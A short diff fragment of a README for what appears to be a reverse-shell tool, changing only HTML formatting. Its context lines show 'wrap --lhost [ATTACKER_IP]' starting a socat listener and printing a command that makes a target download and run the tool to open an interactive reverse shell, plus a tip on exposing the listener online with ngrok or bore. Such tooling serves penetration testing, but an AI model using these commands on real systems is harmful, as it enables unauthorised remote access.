@@ -40,8 +40,7 @@ wrap --lhost [ATTACKER_IP] #launch socat listener + output command to run on tar
 # paste command outputted by wrap: it will download tacos, and launch it to obtain the interactive revshell
 ```
 
-<details>
-<summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
+<details><summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
 Useful if target can't directly reach the attacker machine, but has internet access
 <br> On attacker machine, install <code>ngrok</code> or <code>bore</code> and launch your listener:
 <pre><code>wrap -n
